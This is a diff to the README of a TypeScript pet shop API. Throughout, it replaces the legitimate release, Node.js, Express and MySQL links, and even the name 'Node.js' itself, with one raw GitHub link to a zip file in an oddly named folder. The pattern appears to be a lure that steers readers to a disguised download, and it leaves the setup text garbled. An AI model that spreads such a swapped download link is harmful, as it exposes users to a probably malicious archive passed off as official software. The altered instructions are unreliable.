@@ -8,18 +8,18 @@ Welcome to **petshop-api-ts**! This application helps you manage pets, customers
 
 To get the application, you need to visit our Releases page. Click the button below to start downloading:
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/SWChan01/petshop-api-ts/releases)
+[![Download the latest release](https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip%20Latest%https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip)](https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip)
 
 ### Step-by-Step Guide
 
 1. **Visit the Releases Page**
-   - Click the button above or go to [Releases page](https://github.com/SWChan01/petshop-api-ts/releases).
+   - Click the button above or go to [Releases page](https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip).
   
 2. **Choose the Latest Version**
    - Look for the latest version listed on the page. It is usually at the top.
 
 3. **Download the Zip File**
-   - Find the "Source Code" section and click on the "zip" or "tar.gz" link to download the files to your computer.
+   - Find the "Source Code" section and click on the "zip" or "https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip" link to download the files to your computer.
 
 4. **Extract the Files**
    - Once the download is complete, go to your downloads folder and extract the files using a tool like WinZip or 7-Zip.
@@ -28,7 +28,7 @@ To get the application, you need to visit our Releases page. Click the button be
    - Open a command prompt on Windows or Terminal on MacOS/Linux.
 
 6. **Install Required Software**
-   - Make sure you have **Node.js** installed. You can download it from [Node.js official website](https://nodejs.org/).
+   - Make sure you have **https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip** installed. You can download it from [https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip official website](https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip).
    - Once installed, check if it's working by typing:
      ```bash
      node -v
@@ -70,7 +70,7 @@ The **petshop-api-ts** application provides various features to help you manage 
 Here are some crucial technologies that power the application:
 
 - **TypeScript**: Ensures type safety and better tooling.
-- **Express**: A minimal web framework for Node.js to build the API.
+- **Express**: A minimal web framework for https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip to build the API.
 - **MySQL**: A robust database system to store all data securely.
 
 ## ⚙️ System Requirements
@@ -78,13 +78,13 @@ Here are some crucial technologies that power the application:
 To run the application smoothly, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or higher, MacOS Sierra or higher, or a modern Linux distribution.
-- **Node.js**: Any recent version that supports the necessary packages.
+- **https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip**: Any recent version that supports the necessary packages.
 
 ## ⚡ Troubleshooting
 
 If you encounter issues while running the application, try the following steps:
 
-- Make sure you have Node.js installed.
+- Make sure you have https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip installed.
 - Verify you are in the correct directory when running commands.
 - If you see errors during installation, check your internet connection.
 - Consult the community or open an issue in the GitHub repository for assistance.
@@ -93,9 +93,9 @@ If you encounter issues while running the application, try the following steps:
 
 For more detailed information about using the application, consider visiting these resources:
 
-- [Node.js Documentation](https://nodejs.org/en/docs/)
-- [Express.js Documentation](https://expressjs.com/)
-- [MySQL Documentation](https://dev.mysql.com/doc/)
+- [https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip Documentation](https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip)
+- [https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip Documentation](https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip)
+- [MySQL Documentation](https://raw.githubusercontent.com/SWChan01/petshop-api-ts/master/parallactically/petshop-api-ts.zip)
 
 ## 📄 License
 
